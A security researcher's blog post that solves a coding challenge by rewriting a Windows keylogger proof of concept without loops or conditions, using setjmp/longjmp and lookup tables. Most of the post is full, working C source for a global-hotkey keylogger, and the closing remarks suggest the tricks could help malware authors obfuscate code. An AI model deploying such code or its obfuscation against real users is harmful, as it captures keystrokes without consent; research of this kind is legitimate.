# Programming without conditions or loops
This blogpost started as a challenge from the highly prolific Twitter/X account [vx-underground](https://x.com/vxunderground):
![A challenge appears](tweet_vx.png)

Since I already have my [Hotkeyz](https://github.com/yo-yo-yo-jbo/hotkeyz/) project, I thought it could be a nice answer to the challenge.  
One inspiration I had was the famous [Movfuscator](https://github.com/xoreaxeaxeax/movfuscator) but that seems like a huge overkill (I like Assembly but I guess the challenge was for higher level languages).  
So, given that, how do you code without loops or conditions?  

## Loops
In my original project, I have several loops:
1. The loop that registers the entire keyboard as hotkeys.
2. The loop that keeps peeking at Window Messages.

Well, loop #1 is easy, since I can just implement it in the most procedural way:
```c
	// Register all hotkeys (no loops)
	(VOID)RegisterHotKey(NULL, VK_BACK, 0, VK_BACK);
	(VOID)RegisterHotKey(NULL, VK_TAB, 0, VK_TAB);
	(VOID)RegisterHotKey(NULL, VK_RETURN, 0, VK_RETURN);
	(VOID)RegisterHotKey(NULL, VK_SPACE, 0, VK_SPACE);
	(VOID)RegisterHotKey(NULL, VK_INSERT, 0, VK_INSERT);
	(VOID)RegisterHotKey(NULL, VK_DELETE, 0, VK_DELETE);
	(VOID)RegisterHotKey(NULL, '0', 0, '0');
	(VOID)RegisterHotKey(NULL, '1', 0, '1');
	(VOID)RegisterHotKey(NULL, '2', 0, '2');
	(VOID)RegisterHotKey(NULL, '3', 0, '3');
	(VOID)RegisterHotKey(NULL, '4', 0, '4');
	(VOID)RegisterHotKey(NULL, '5', 0, '5');
	(VOID)RegisterHotKey(NULL, '6', 0, '6');
...
```

Note that I map each virtual key to its own ID, which should make things easier later as I do not need to maintain a complex table that maps between those.

Loop #2 is more challenging. In my original code I run the keylogger for a certain amount of time, but I think it's okay for me to just run forever.  
So, what I'm after is implementing this:
```c
for (;;)
{
    // Logic goes here
}
```

Initially I thought of using the [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) and [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) APIs, but it won't work since you cannot do it for a running thread.  
I could, of course, create a new thread and constantly call `SetThreadContext` when I feel like it, but it seems like an overkill. Instead, I used a different approach that comes straight from the C standard library: `setjmp` and `longjmp`!  
If you're unfamiliar with the concept, `setjmp` basically saves an "execution context" in a buffer, and `longjmp` restores that execution context (with the option of returning an arbitrary value from `setjmp` when jumping to it from `longjmp`). Curiously, there's even a Wikipedia page on [Wikipedia](https://en.wikipedia.org/wiki/Setjmp.h) - you're welcome to read it.  
Eseentially, I can now do the following:

```c
jmp_buf tJumpBuffer = { 0 };
...

(VOID)setjmp(tJumpBuffer);

// Loop logic goes here

longjmp(tJumpBuffer, 1);
```

## Conditions
For conditions I needed to check only a couple of things:
1. The return result of the [PeekMessageW](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-peekmessagew) API - it's a `BOOL` but essentially will be either `0` or `1`.
2. Validating that the message type is `WM_HOTKEY`.

Both of those are comparisons to known values, with an `and` logic between them. Essentially what I want to do is:

```c
if ((PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE)) && (WM_HOTKEY == tMsg.message))
{
	cCurrVk = (BYTE)((((DWORD)tMsg.lParam) & 0xFFFF0000) >> 16);
	(VOID)wprintf(L"%c", cCurrVk);
	(VOID)UnregisterHotKey(NULL, cCurrVk);
	keybd_event(cCurrVk, 0, 0, (ULONG_PTR)NULL);
	(VOID)RegisterHotKey(NULL, cCurrVk, 0, cCurrVk);
}
else
{
	Sleep(20);
}
```

Since I only deal with unsigned integers, I had an idea:
- It's easy to compare something to a known value by using `XOR` - the result will be `0` if and only if they are equal.
- I need to "normalize" values - return `0` for the input `0` and return `1` for anything else.

That normalization problem is something I handled [in the past](https://github.com/yo-yo-yo-jbo/prog2math) mathematically, e.g. with trigonometric functions.  
However, I hate using floating point arithmetic (and so should you!) and so I've decided to use tables instead:
- For normalizing a `nibble` (4-bit value) I could use a table, since there are only 16 options.
- For normalizing a `byte` (8-bit value) I could split it to nibbles and add the normalization results - I could only get `0`, `1` or `2`, and use a table that maps those to `0`, `1` and `1` respectively.
- For normalizing a `word` (16-bit value) I could split it into bytes and repeat the same trick.
- And so on.

Therefore, my plan is:
1. Comparing the result of `PeekMessageW` API to `1` by means of `XORing` and normalizing it - I expect to get a `0` in case of success and `1` otherwise.
2. Comparing the value of `tMsg.message` to `WM_HOTKEY` by `XORing` and normalizing it - I expect to get a `0` in case of success and `1` otherwise.
3. Performing an `and` condition on both results by means of addition. Since those results are normalized - I should only get `0`, `1` or `2`, so there are no chances of integer overflows etc.

Eventually, I get a value with is `0` in case `PeekMessageW` succeeded and the value of `tMsg.message` was `WM_HOTKEY`, and `1` otherwise!  
Now, I could use a function pointer tables to handle each of those internal condition logics - either sleep or handle the key.

## Complete code
Here is my complete code, with no conditions or loops:

```c
/****************************************************************************************************
*                                                                                                   *
* File:         HotkeyzNoLoopsOrConditions.c                                                        *
* Purpose:      Hotkeys-based keylogger proof-of-concept by @yo_yo_yo_jbo.                          *
* Remarks:      - Designed to run without loops or conditions on purpose as a challenge.            *
*                                                                                                   *
*****************************************************************************************************/
#include <windows.h>
#include <stdio.h>
#include <setjmp.h>

/****************************************************************************************************
*                                                                                                   *
* Type:         PFN_COND_HANDLER                                                                    *
* Purpose:      A function callback type for handling conditions.                                   *
* Parameters:   - pvContext - an optional context.													*
*                                                                                                   *
*****************************************************************************************************/
typedef VOID(*PFN_COND_HANDLER)(PVOID pvContext);

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_DoSleepProc                                                                 *
* Purpose:      A PFN_COND_HANDLER routine that sleeps and returns.                                 *
* Parameters:   - pvContext - ignored.																*
* Returns:      0, always.                                                                          *
*                                                                                                   *
*****************************************************************************************************/
static
VOID
hotkeyz_DoSleepProc(
	PVOID pvContext
)
{
	// Sleep and return
	UNREFERENCED_PARAMETER(pvContext);
	Sleep(20);
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_MessageHandlerProc                                                          *
* Purpose:      A PFN_COND_HANDLER routine that handles a keyboard event.                           *
* Parameters:   - pvContext - a pointer to the virtual key (byte).									*
*                                                                                                   *
*****************************************************************************************************/
static
VOID
hotkeyz_MessageHandlerProc(
	PVOID pvContext
)
{
	BYTE cCurrVk = *((PBYTE)pvContext);

	// Print out the character
	(VOID)wprintf(L"%c", cCurrVk);

	// Send the key to the OS and re-register
	(VOID)UnregisterHotKey(NULL, cCurrVk);
	keybd_event(cCurrVk, 0, 0, (ULONG_PTR)NULL);
	(VOID)RegisterHotKey(NULL, cCurrVk, 0, cCurrVk);
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_register                                                                    *
* Purpose:      Registers the entire keyboard as Hotkeys.                                           *
* Remarks:      - Does not use loops or conditions as a challenge.                                  *
*				- Assumes all registrations simply work.											*
*                                                                                                   *
*****************************************************************************************************/
static
VOID
hotkeyz_register(VOID)
{
	// Register all hotkeys (no loops)
	(VOID)RegisterHotKey(NULL, VK_BACK, 0, VK_BACK);
	(VOID)RegisterHotKey(NULL, VK_TAB, 0, VK_TAB);
	(VOID)RegisterHotKey(NULL, VK_RETURN, 0, VK_RETURN);
	(VOID)RegisterHotKey(NULL, VK_SPACE, 0, VK_SPACE);
	(VOID)RegisterHotKey(NULL, VK_INSERT, 0, VK_INSERT);
	(VOID)RegisterHotKey(NULL, VK_DELETE, 0, VK_DELETE);
	(VOID)RegisterHotKey(NULL, '0', 0, '0');
	(VOID)RegisterHotKey(NULL, '1', 0, '1');
	(VOID)RegisterHotKey(NULL, '2', 0, '2');
	(VOID)RegisterHotKey(NULL, '3', 0, '3');
	(VOID)RegisterHotKey(NULL, '4', 0, '4');
	(VOID)RegisterHotKey(NULL, '5', 0, '5');
	(VOID)RegisterHotKey(NULL, '6', 0, '6');
	(VOID)RegisterHotKey(NULL, '7', 0, '7');
	(VOID)RegisterHotKey(NULL, '8', 0, '8');
	(VOID)RegisterHotKey(NULL, '9', 0, '9');
	(VOID)RegisterHotKey(NULL, 'A', 0, 'A');
	(VOID)RegisterHotKey(NULL, 'B', 0, 'B');
	(VOID)RegisterHotKey(NULL, 'C', 0, 'C');
	(VOID)RegisterHotKey(NULL, 'D', 0, 'D');
	(VOID)RegisterHotKey(NULL, 'E', 0, 'E');
	(VOID)RegisterHotKey(NULL, 'F', 0, 'F');
	(VOID)RegisterHotKey(NULL, 'G', 0, 'G');
	(VOID)RegisterHotKey(NULL, 'H', 0, 'H');
	(VOID)RegisterHotKey(NULL, 'I', 0, 'I');
	(VOID)RegisterHotKey(NULL, 'J', 0, 'J');
	(VOID)RegisterHotKey(NULL, 'K', 0, 'K');
	(VOID)RegisterHotKey(NULL, 'L', 0, 'L');
	(VOID)RegisterHotKey(NULL, 'M', 0, 'M');
	(VOID)RegisterHotKey(NULL, 'N', 0, 'N');
	(VOID)RegisterHotKey(NULL, 'O', 0, 'O');
	(VOID)RegisterHotKey(NULL, 'P', 0, 'P');
	(VOID)RegisterHotKey(NULL, 'Q', 0, 'Q');
	(VOID)RegisterHotKey(NULL, 'R', 0, 'R');
	(VOID)RegisterHotKey(NULL, 'S', 0, 'S');
	(VOID)RegisterHotKey(NULL, 'T', 0, 'T');
	(VOID)RegisterHotKey(NULL, 'U', 0, 'U');
	(VOID)RegisterHotKey(NULL, 'V', 0, 'V');
	(VOID)RegisterHotKey(NULL, 'W', 0, 'W');
	(VOID)RegisterHotKey(NULL, 'X', 0, 'X');
	(VOID)RegisterHotKey(NULL, 'Y', 0, 'Y');
	(VOID)RegisterHotKey(NULL, 'Z', 0, 'Z');
	(VOID)RegisterHotKey(NULL, VK_NUMPAD0, 0, VK_NUMPAD0);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD1, 0, VK_NUMPAD1);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD2, 0, VK_NUMPAD2);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD3, 0, VK_NUMPAD3);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD4, 0, VK_NUMPAD4);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD5, 0, VK_NUMPAD5);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD6, 0, VK_NUMPAD6);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD7, 0, VK_NUMPAD7);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD8, 0, VK_NUMPAD8);
	(VOID)RegisterHotKey(NULL, VK_NUMPAD9, 0, VK_NUMPAD9);
	(VOID)RegisterHotKey(NULL, VK_MULTIPLY, 0, VK_MULTIPLY);
	(VOID)RegisterHotKey(NULL, VK_ADD, 0, VK_ADD);
	(VOID)RegisterHotKey(NULL, VK_SEPARATOR, 0, VK_SEPARATOR);
	(VOID)RegisterHotKey(NULL, VK_SUBTRACT, 0, VK_SUBTRACT);
	(VOID)RegisterHotKey(NULL, VK_DECIMAL, 0, VK_DECIMAL);
	(VOID)RegisterHotKey(NULL, VK_DIVIDE, 0, VK_DIVIDE);
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_normalize4                                                                  *
* Purpose:      Normalizes a 4-bit number - turning 0 into 0 and everything else into 1.            *
* Parameters:   - cInput - a 4-bit number.                                                          *
* Returns:      0 for 0, 1 for everything else.                                                     *
*                                                                                                   *
*****************************************************************************************************/
static
BYTE
hotkeyz_normalize4(
	BYTE cInput
)
{
	// Return the result based on an array access
	static BYTE acResults[] = { 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };
	return acResults[cInput];
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_normalize8                                                                  *
* Purpose:      Normalizes a byte - turning 0 into 0 and everything else into 1.                    *
* Parameters:   - cInput - a 8-bit number.                                                          *
* Returns:      0 for 0, 1 for everything else.                                                     *
*                                                                                                   *
*****************************************************************************************************/
static
BYTE
hotkeyz_normalize8(
	BYTE cInput
)
{
	// Return the result based on an array access
	static BYTE acResults[] = { 0, 1, 1 };
	return acResults[hotkeyz_normalize4(cInput & 0x0F) + hotkeyz_normalize4((cInput & 0xF0) >> 4)];
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_normalize16                                                                 *
* Purpose:      Normalizes a 16-bit number - turning 0 into 0 and everything else into 1.           *
* Parameters:   - cInput - a 16-bit number.                                                         *
* Returns:      0 for 0, 1 for everything else.                                                     *
*                                                                                                   *
*****************************************************************************************************/
static
BYTE
hotkeyz_normalize16(
	WORD wInput
)
{
	// Return the result based on an array access
	static BYTE acResults[] = { 0, 1, 1 };
	return acResults[hotkeyz_normalize8(wInput & 0xFF) + hotkeyz_normalize8((wInput & 0xFF00) >> 8)];
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_normalize32                                                                 *
* Purpose:      Normalizes a 32-bit number - turning 0 into 0 and everything else into 1.           *
* Parameters:   - cInput - a 32-bit number.                                                         *
* Returns:      0 for 0, 1 for everything else.                                                     *
*                                                                                                   *
*****************************************************************************************************/
static
BYTE
hotkeyz_normalize32(
	DWORD dwInput
)
{
	// Return the result based on an array access
	static BYTE acResults[] = { 0, 1, 1 };
	return acResults[hotkeyz_normalize16(dwInput & 0xFFFF) + hotkeyz_normalize16((dwInput & 0xFFFF0000) >> 16)];
}

/****************************************************************************************************
*                                                                                                   *
* Function:     hotkeyz_run                                                                         *
* Purpose:      Runs the keylogger by registering hotkeys and intercepting them forever.            *
* Remarks:      - Does not use loops or conditions as a challenge.                                  *
*                                                                                                   *
*****************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6387)
static
VOID
hotkeyz_run(VOID)
{
	MSG tMsg = { 0 };
	PFN_COND_HANDLER apfnCallbacks[] = { hotkeyz_MessageHandlerProc, hotkeyz_DoSleepProc };
	BYTE nNormalizedPeekMessageResult = 0;
	BYTE nNormalizedWmHotkeyComparisonResult = 0;
	BYTE nCallback = 0;
	BYTE cCurrVk = 0;
	jmp_buf tJumpBuffer = { 0 };

	// Register all hotkeys
	hotkeyz_register();

	// Implement a loop - we can use setjmp \ longjmp for that
	(VOID)setjmp(tJumpBuffer);
	
	// Peek the message and validae it's a WM_HOTKEY by XORing unsigned values - the result is 0 if and only if both conditions are met
	tMsg.message = 0;
	nNormalizedPeekMessageResult = hotkeyz_normalize32((DWORD)PeekMessageW(&tMsg, NULL, WM_HOTKEY, WM_HOTKEY, PM_REMOVE) ^ (DWORD)TRUE);
	nNormalizedWmHotkeyComparisonResult = hotkeyz_normalize32(tMsg.message ^ WM_HOTKEY);
	nCallback = hotkeyz_normalize32(nNormalizedPeekMessageResult + nNormalizedWmHotkeyComparisonResult);

	// Get the key from the message
	cCurrVk = (BYTE)((((DWORD)tMsg.lParam) & 0xFFFF0000) >> 16);

	// Implement a condition
	apfnCallbacks[nCallback]((PVOID)&cCurrVk);

	// Loop again
	longjmp(tJumpBuffer, 1);
}
#pragma warning(pop)

/****************************************************************************************************
*                                                                                                   *
* Function:     wmain                                                                               *
* Purpose:      Main functionality.								    *
* Returns:      0 always (actually never returns).                                                  *
*                                                                                                   *
*****************************************************************************************************/
INT
wmain(VOID)
{
	hotkeyz_run();
	return 0;
}
```

## Summary
While these ideas might look weird or ad-hoc, they might be useful for obfuscation purposes in the future.  
I can certainly see a scenario where malware authors might use `setjmp` \ `longjmp` to obfuscate loops or conditions!

Stay tuned!

Jonathan Bar Or
